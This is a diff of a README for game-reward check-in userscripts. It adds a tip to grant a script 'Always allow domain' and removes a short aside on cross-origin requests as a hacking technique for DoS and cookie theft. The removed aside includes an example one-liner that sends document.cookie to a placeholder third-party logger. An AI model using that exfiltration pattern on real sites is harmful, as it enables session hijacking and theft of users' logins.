@@ -91,15 +91,10 @@ A: Yes - to keep it alive, until 2022
 (requires Tampermonkey/Greasemonkey Opera/Chrome/Firefox extension)<br>
 #### NOTE: Only the account that is currently logged in, I may make a script for quick multi-account in few lines(C#) in the future!<br>
 Every 3h script will try to check-in<br>
+If script asks to allow requests, click on "Always allow domain" or similar button.<br>
 __Script will trigger when you are casually watching youtube videos, or just browsing__<br>
 This script will send 2 requests, one will attempt to get checkin game reward, and the other request is another checkin<br>
 I have tested it on other accounts and it should be working for you as well<br>
-#### ALL SERVERS
-Junior Developers may freak out because they'll see error(s) in the console, in the contrary `it just works™` because request is sent, but the response cannot arrive due CORS
-- This technique is very common in Hacking
-  - It was being used for DoS-ing
-  - Or sending `document.cookie` to the 3rd party logger website
-    - Sending `document.cookie` was mostly sent via `(new Image).src="...?_="+encodeURIComponent(document.cookie)`
 
 ## quickfmg.js
 (requires Tampermonkey/Greasemonkey Opera/Chrome/Firefox extension)<br>
